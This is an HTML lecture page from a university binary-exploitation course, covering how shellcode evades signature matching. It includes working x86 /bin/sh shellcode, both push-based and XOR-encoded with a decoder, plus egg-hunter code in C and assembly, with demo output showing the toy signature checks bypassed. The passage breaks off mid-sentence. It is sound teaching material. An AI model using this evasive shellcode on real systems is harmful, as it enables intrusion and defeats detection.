@@ -1,0 +1,871 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Lec. 13: Obfuscating Shell Code and Egg Hunting</title>
+<!-- 2015-10-09 Fri 17:36 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { color: green; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  td, th { vertical-align:top;  }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012  Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 13: Obfuscating Shell Code and Egg Hunting</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#sec-1">1. Signature Matching Defenses</a></li>
+<li><a href="#sec-2">2. Obfuscating Shell Code</a>
+<ul>
+<li><a href="#sec-2-1">2.1. Simple Push Based Obfuscation</a></li>
+<li><a href="#sec-2-2">2.2. Decoder Obfuscated Shell Code</a></li>
+</ul>
+</li>
+<li><a href="#sec-3">3. Egg-Hunt Shell Code</a>
+<ul>
+<li><a href="#sec-3-1">3.1. Determining a Good Egg</a></li>
+<li><a href="#sec-3-2">3.2. How to Hunt and Egg</a></li>
+<li><a href="#sec-3-3">3.3. Putting it all together</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> Signature Matching Defenses</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Continuing our discussion of advanced shell code. In the last class we
+reduced the size of our shell code from 37 bytes to 21, but sometimes
+it is not the size of the shell code, but the content. For example,
+modern intrusion detection systems may scan the contents of program
+for "/bin/sh" or even "sh" to try and stop shell code. Here's a really
+simple example code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #00ffff;">if</span>(argc &lt; 2){
+    printf(<span style="color: #ffa07a;">"ERROR: Require argument\n"</span>);
+    exit(1);
+  }
+
+  <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">p</span>;
+  <span style="color: #00ffff;">for</span>(p=argv[1];*p;p++){
+
+    <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check for any "sh" so not to be exploited!</span>
+    <span style="color: #00ffff;">if</span> (strncmp(p,<span style="color: #ffa07a;">"sh"</span>,2) == 0){
+      printf(<span style="color: #ffa07a;">"No way Jose!\n"</span>);
+      exit(2);
+    }
+  }
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">execute as binary code</span>
+  ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) argv[1])();
+
+  <span style="color: #00ffff;">return</span>;
+}
+</pre>
+</div>
+
+
+<p>
+This code will balk whenever the input string contains the word "sh"
+as needed for our shell code. 
+</p>
+
+<p>
+As you can see, in our 21 byte shell code, we are going to have a
+problem getting passed the signature:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./sig_matcher $(printf `./hexify.sh smallest_shell`)
+No way Jose!
+</pre>
+
+<p>
+This is a toy example, but such a program could compare against any
+kind of input type to match shell code. This is called <i>signature
+matching</i> and it is a common defense to prevent exploits. Here's a
+more complex signature matching scheme:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">user@si485H-base:demo$ cat execve_sigmatcher.c
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+
+<span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check for the sig0 start finished by sig1 in str</span>
+<span style="color: #98fb98;">int</span> check_sig(<span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">str</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">sig0</span>,<span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">sig1</span>){
+
+  <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">p</span>,*<span style="color: #eedd82;">q</span>;
+
+  <span style="color: #00ffff;">for</span>(p=str;*p;p++){
+
+    <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">checking for start of signature</span>
+    <span style="color: #00ffff;">if</span> ( strncmp(p,sig0,strlen(sig0)) == 0 ){
+
+      <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">checking for end of signature</span>
+      <span style="color: #00ffff;">for</span>(q=p;*q;q++){
+        <span style="color: #00ffff;">if</span> (strncmp(q,sig1,strlen(sig1)) == 0){
+          <span style="color: #00ffff;">return</span> 1;<span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">found signature</span>
+        }
+      }
+    }
+  }
+
+  <span style="color: #00ffff;">return</span> 0; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">did not find signautre</span>
+
+
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #00ffff;">if</span>(argc &lt; 2){
+    printf(<span style="color: #ffa07a;">"ERROR: Require argument\n"</span>);
+    exit(1);
+  }
+
+  <span style="color: #ff7f24;">//                      </span><span style="color: #ff7f24;">mov al,0xb   int 0x80</span>
+  <span style="color: #00ffff;">if</span> ( check_sig(argv[1], <span style="color: #ffa07a;">"\xb0\x0b"</span>, <span style="color: #ffa07a;">"\xcd\x80"</span>) ||
+       <span style="color: #ff7f24;">//                </span><span style="color: #ff7f24;">xor ecx,ecx  int 0x80</span>
+       check_sig(argv[1], <span style="color: #ffa07a;">"\x31\xc9"</span>, <span style="color: #ffa07a;">"\xcd\x80"</span>)){
+
+    printf(<span style="color: #ffa07a;">"No Way Jose!\n"</span>);
+    exit(2);
+  }
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">execute as binary code</span>
+  ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) argv[1])();
+
+  <span style="color: #00ffff;">return</span>;
+}
+</pre>
+</div>
+
+
+<p>
+In this scheme, the signature is looking for some possibly shell code
+indicative instruction, like <code>mov al, 0xb</code> or <code>xor ecx,ecx</code> which is
+followed by an <code>int 0x80</code> at some point later.  This signature is,
+clearly, a lot harder to defeat with the shell code we've been using
+so far. What to do?!
+</p>
+</div>
+</div>
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2"><span class="section-number-2">2</span> Obfuscating Shell Code</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+In the community, it is generally considered that signature matching
+schemes can be easily defeated with <i>obfuscated</i> and <i>polymorphic</i>
+shell code. In these variants, the shell code is some how changed
+dynamically such that it will pass a signature matching scheme.
+</p>
+
+<p>
+We will focus on simple obfuscated shell code scheme which will encode
+the shell code portion the program and then use a decoder to decode
+the shell code prior to execution. You can imagine expanding this
+scheme to polymorphic shell code, where by each version of the shell
+code changes &#x2026; but that might be a discussion for another day (or
+year).
+</p>
+</div>
+
+<div id="outline-container-sec-2-1" class="outline-3">
+<h3 id="sec-2-1"><span class="section-number-3">2.1</span> Simple Push Based Obfuscation</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+To start, let's make the observation that we can rewrite our shell
+code for our 21 byte shell code using a series of push commands
+followed by a call to <code>esp</code> (or a jmp). 
+</p>
+
+<p>
+Here are the bytes to our small shell code from objdump:
+</p>
+<pre class="example">
+8048060:	31 c9                	xor    ecx,ecx
+ 8048062:	f7 e1                	mul    ecx
+ 8048064:	50                   	push   eax
+ 8048065:	68 6e 2f 73 68       	push   0x68732f6e
+ 804806a:	68 2f 2f 62 69       	push   0x69622f2f
+ 804806f:	89 e3                	mov    ebx,esp
+ 8048071:	b0 0b                	mov    al,0xb
+ 8048073:	cd 80                	int    0x80
+</pre>
+<p>
+First, I want to conver this into little-endian encode 4-byte
+sequences that I can push onto the stack. I've written a script to do
+this <code>le-foourbyte.py</code> and is provided in the classed tools
+directory. Here's an example of using it on this shell code:
+</p>
+<pre class="example">
+user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py -
+0xe1f7c931
+0x2f6e6850
+0x2f686873
+0x8969622f
+0xcd0bb0e3
+0x90909080
+</pre>
+<p>
+As you can see, if you look closely, that all the bytes are there
+encoded into little endian.
+</p>
+
+<p>
+Now, to use this in another version of the shell code, we will want
+push in reverse order, and we can use the <code>tac</code> command (<code>cat</code>
+backwards) to print this in reverse:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py - | tac
+0x90909080
+0xcd0bb0e3
+0x8969622f
+0x2f686873
+0x2f6e6850
+0xe1f7c931
+</pre>
+
+<p>
+And, then we can dump this into some shell code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="push_shell.asm"><span style="color: #87cefa;">section</span> .text
+        <span style="color: #00ffff;">global</span> _start
+<span style="color: #87cefa;">_start</span>: 
+        <span style="color: #00ffff;">push</span> 0x90909080
+        <span style="color: #00ffff;">push</span> 0xcd0bb0e3
+        <span style="color: #00ffff;">push</span> 0x8969622f
+        <span style="color: #00ffff;">push</span> 0x2f686873
+        <span style="color: #00ffff;">push</span> 0x2f6e6850
+        <span style="color: #00ffff;">push</span> 0xe1f7c931
+        <span style="color: #00ffff;">call</span> esp
+</pre>
+</div>
+<p>
+And now, we pass the simple sigchecks from before because we split up
+the <code>int 0x80</code> instruction bytes.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./execve_sigmatcher $(printf `./hexify.sh push_shell`)
+$
+</pre>
+<p>
+But, surprisingly, we still fail the more naive checking for "sh"
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./simple_sigmatcher $(printf `./hexify.sh push_shell`)
+No way Jose!
+</pre>
+<p>
+We need to do a bit more work.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-2-2" class="outline-3">
+<h3 id="sec-2-2"><span class="section-number-3">2.2</span> Decoder Obfuscated Shell Code</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+The next step in obfuscation is to actually encode the bytes of the
+shell code in some way, push them onto the stack, and then decode them
+at run time. We will use a very basic encoding scheme that will <code>xor</code>
+the bytes with a key. It's important that the key does not exist in
+the shell code, otherwise we may introduce a null byte. 
+</p>
+
+<p>
+I don't see any 0xFF in the shell code, so we will use that as the
+key, essentially inverting the bytes. The <code>le-fourbytes.py</code> script
+will do this too:
+</p>
+<pre class="example">
+user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py - 0xFF | tac
+0x6f6f6f7f
+0x32f44f1c
+0x76969dd0
+0xd097978c
+0xd09197af
+0x1e0836ce
+</pre>
+<p>
+That looks good. Now, all we need to do is write a decoder in assembly
+that will step through and invert all the bytes on the stack before
+calling <code>esp</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">SECTION</span> .text
+        <span style="color: #00ffff;">global</span> _start
+
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">push encoded shell code</span>
+        <span style="color: #00ffff;">push</span> 0x6f6f6f7f
+        <span style="color: #00ffff;">push</span> 0x32f44f1c
+        <span style="color: #00ffff;">push</span> 0x76969dd0
+        <span style="color: #00ffff;">push</span> 0xd097978c
+        <span style="color: #00ffff;">push</span> 0xd09197af
+        <span style="color: #00ffff;">push</span> 0x1e0836ce         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">24=6*4 bytes long</span>
+
+
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">DECODER</span>
+
+        <span style="color: #00ffff;">xor</span> eax,eax,            <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">zero out eax</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">zerp out ecx</span>
+        <span style="color: #00ffff;">mov</span> cl,0x18             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">set ecx to 24, length of shell code</span>
+<span style="color: #87cefa;">decode</span>:
+        <span style="color: #00ffff;">mov</span> al,[esp+ecx-1]      <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">load byte at front int al</span>
+        <span style="color: #00ffff;">xor</span> al,0xff             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">decode byte</span>
+        <span style="color: #00ffff;">mov</span> [esp+ecx-1],al      <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">write byte back</span>
+        <span style="color: #00ffff;">loop</span> decode             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">decrement ecx and jmp to decode until ecx is zero</span>
+
+        <span style="color: #00ffff;">call</span> esp                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">call esp to execute shell code</span>
+</pre>
+</div>
+
+<p>
+There are few new assembly instructions, but most should be
+familiar. The new instruction is <code>loop</code>, which will do an condition
+jump based on the value of <code>ecx</code> register and also decrement
+<code>ecx</code>. Once <code>ecx</code> is zero, it will no longer jump. 
+</p>
+
+<p>
+In total, this shell code is one part pushing on the encoded shell
+code and one part decoding that shell code. Once the shell code is
+decoded, we can call <code>esp</code> and execute the shell code.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./encoded_shell 
+$
+</pre>
+<p>
+And this will pass all our signature matchers:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./simple_sigmatcher $(printf `./hexify.sh encoded_shell`)
+$ 
+user@si485H-base:demo$ ./execve_sigmatcher $(printf `./hexify.sh encoded_shell`)
+$
+</pre>
+<p>
+But, you might be thinking, wait, couldn't write signatures that match
+the decoder? Of course, but then we can write more obfuscated
+decoders, and then they can write signatures for that, and we
+obfuscate again, and then more signatures, etc. This is why a
+signature scheme will always fail in the long run.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3"><span class="section-number-2">3</span> Egg-Hunt Shell Code</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Let's consider another technique for subverting signature matching
+scheme called the <i>egg hunt</i>.  In the egg hunt, we consider a scenario
+where we can't easily upload our shell code in a way that will
+execute. This could occur because either there isn't enough space in
+the overflow buffer for the shell code, or that there are good
+signature matching schemes in place. Either way, we are currently
+hosed in getting our shell code to execute directly.
+</p>
+
+<p>
+However, all may not be loss. Even if we can't get our shell code to
+execute, we may be able to get it into the memory address space of the
+program and get some other piece of code to execute for the buffer
+overrun, one that fits in the buffer or doesn't match a current
+signature. The challenge now is, how do we eventually execute our
+shell code? And, more precisely, how do we find it in memory?
+</p>
+
+<p>
+This is the so called "egg hunt!" What we can do is plant an egg in
+our shell code, and have another piece of software search the <i>entire</i>
+memory address space searching for it.
+</p>
+</div>
+
+<div id="outline-container-sec-3-1" class="outline-3">
+<h3 id="sec-3-1"><span class="section-number-3">3.1</span> Determining a Good Egg</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+A good egg should have two properties: (1) it should consist of <code>nop</code>
+like instructions so that it doesn't affect the shell code, and (2),
+it should be doubled. 
+</p>
+
+<p>
+For the first, a typical egg that we will use is 0x50905090. You'll
+notice that byte 0x90 is a nop, and 0x50 is <code>incr eax</code> so essentially
+a nop. This is a nice egg because once we find the egg, we want to jmp
+to that execution.
+</p>
+
+<p>
+The other important part of an egg, is that it must apear twice. For
+example, here is are huntable shell code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="huntable_shell.asm"><span style="color: #87cefa;">SECTION</span> .text                   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                 <span style="color: #00ffff;">global</span> _start  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #00ffff;">db</span> 0x50,0x90,0x50,0x90  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">egg target</span>
+        <span style="color: #00ffff;">db</span> 0x50,0x90,0x50,0x90
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">mul</span> ecx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">0's edx and and eax</span>
+        <span style="color: #00ffff;">push</span> eax                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">\0</span>
+        <span style="color: #00ffff;">push</span> 0x68732f6e         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">n/sh</span>
+        <span style="color: #00ffff;">push</span> 0x69622f2f         <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">//bi </span>
+
+
+        <span style="color: #00ffff;">mov</span> ebx,esp             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh" is *esp</span>
+        <span style="color: #00ffff;">mov</span> al,0xb              <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+        <span style="color: #00ffff;">int</span> 0x80                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+</pre>
+</div>
+
+<p>
+The reason it must apear in duplicate is that the egg hunt shell code
+must also have a copy of the egg because it will be using it in a
+comparison. Thus, to differentiate the egg hunter from its pray, the
+pray has the egg twice.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-3-2" class="outline-3">
+<h3 id="sec-3-2"><span class="section-number-3">3.2</span> How to Hunt and Egg</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+With the egg figured out and our huntable shell code, let's focus our
+attention on the egg unter. For this, we need two processes:
+</p>
+
+<ol class="org-ol">
+<li>We need to be able to iterate through the entire memory address
+space, from 0x0000000 to 0xFFFFFFFFF, FAST!
+</li>
+
+<li>We need to be able to see if an address can be dereferenced
+without causing a segmentation fault.
+</li>
+</ol>
+
+<p>
+For (1), we need to think about how memory is aligned. Each memory
+region is broken into pages, and pages are bounded by 1024 bytes. This
+means that we jump by 1024 bytes for each address if the address is
+not referenced. 
+</p>
+
+<p>
+For (2), this is a bit more tricky. We can't just dereference the
+address ourselves because that will cause a <code>segfault</code>, but we might be
+able to ask the operating system to check. The <code>access()</code> system call
+is exactly the right tool for this job. 
+</p>
+
+<p>
+Normally, <code>access</code> will check if you have access to the specified
+file. Here' is the manual description:
+</p>
+<pre class="example">
+SYNOPSIS
+       #include &lt;unistd.h&gt;
+
+       int access(const char *pathname, int mode);
+
+DESCRIPTION
+       access() checks whether the calling process can access the file pathname.  
+       If pathname is a symbolic link, it is dereferenced.
+</pre>
+<p>
+We hand it a path name as a reference to a string, an address, and the
+operating system will dereference that address. If the address is not
+accesible, the system call will fail with <code>EFAULT</code> 
+</p>
+
+<pre class="example">
+EFAULT pathname points outside your accessible address space.
+</pre>
+
+<p>
+BUT, it will not segfault! So we can use <code>access()</code> to hunt out
+accessible address spaces. Here's some C code that does that, and once
+it finds the egg, it executes it.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="dummy_hunt.c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;errno.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">p</span> = 0x0000000;
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">egg</span> = 0x90509050;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">egg hunt</span>
+  <span style="color: #00ffff;">while</span>(1){
+
+    <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">peform an acess</span>
+    access( (<span style="color: #98fb98;">char</span> *) p+4, 0);
+    <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check if we EFAULT or not (readible memory or not)</span>
+    <span style="color: #00ffff;">if</span> ( errno != EFAULT){
+
+      <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">treat p as a integer pointer</span>
+      <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> * <span style="color: #eedd82;">q</span> = (<span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> *) p;
+
+      <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">check for egg twice in a row</span>
+      <span style="color: #00ffff;">if</span> (q[0] == 0x90509050 &amp;&amp;
+          q[1] == 0x90509050){
+        <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">execute the shell code if found</span>
+        ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) q)();
+      }
+
+      p++;
+    }<span style="color: #00ffff;">else</span>{
+      <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">if segfaulting move at page boundry</span>
+      p |= 0xfff; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">1 out last 12 bits, </span>
+      p += 1; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">add 1 to cause an overflow to move in 4096 boundaries</span>
+    }
+
+  }
+
+
+}
+</pre>
+</div>
+
+
+<p>
+And if we run this dummy code like so:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./dummy_hunt $(printf $(./hexify.sh huntable_shell))
+</pre>
+<p>
+The huntable<sub>shell</sub> is a command line argument, which means it is
+loaded into the memory of the program. The egg hunter will find the
+shell code, eventually, and drop us into the shell. How long does it take?
+</p>
+<pre class="example">
+user@si485H-base:demo$ time ./dummy_hunt $(printf $(./hexify.sh huntable_shell)) &lt; /dev/null
+
+real	0m9.038s
+user	0m0.628s
+sys	0m6.568s
+</pre>
+
+<p>
+That long. Which is pretty fast, but not soo fast. 
+</p>
+</div>
+</div>
+<div id="outline-container-sec-3-3" class="outline-3">
+<h3 id="sec-3-3"><span class="section-number-3">3.3</span> Putting it all together</h3>
+<div class="outline-text-3" id="text-3-3">
+<p>
+Ok, now that we have a sense of how to hunt an egg, let's translate
+that logic into assembly and write an egg hunt shell code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">SECTION</span> .text
+        <span style="color: #00ffff;">global</span> _start
+
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #00ffff;">mov</span> ebx, 0x90509050     <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">store value of egg</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">clear registers ecx</span>
+        <span style="color: #00ffff;">mul</span> ecx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">clear register edx,eax</span>
+
+<span style="color: #87cefa;">j1</span>:     <span style="color: #00ffff;">or</span> dx,0xfff             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">move in page boundaries by 4096 byte boundaries</span>
+
+<span style="color: #87cefa;">j2</span>:     <span style="color: #00ffff;">inc</span> edx,                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">move by 1</span>
+
+        <span style="color: #00ffff;">pusha</span>                   <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">save registers on stack</span>
+        <span style="color: #00ffff;">lea</span> ebx,[edx+0x4]       <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">load address 4 bytes for ebx</span>
+        <span style="color: #00ffff;">mov</span> al,0x21             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">set up access()</span>
+        <span style="color: #00ffff;">int</span> 0x80                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">system call</span>
+
+        <span style="color: #00ffff;">cmp</span> al,0xf2             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">compare to -14 EFAULT</span>
+        <span style="color: #00ffff;">popa</span>                    <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">restore register state from stack</span>
+
+        <span style="color: #00ffff;">jz</span> j1                   <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">if EFAULT, move in page boundary</span>
+
+        <span style="color: #00ffff;">cmp</span> [edx],ebx           <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">check for first egg</span>
+        <span style="color: #00ffff;">jnz</span> j2                  <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">jump if not there</span>
+
+        <span style="color: #00ffff;">cmp</span> [edx+0x4],ebx       <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">check for second egg</span>
+        <span style="color: #00ffff;">jnz</span> j2                  <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">jump if not there</span>
+
+        <span style="color: #00ffff;">jmp</span> edx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">found egg, jump to egg</span>
+</pre>
+</div>
+
+
+<p>
+Now, we can use our dummy exploit, with our egg hunt shell code and
+our huntable shell code to see it work together:
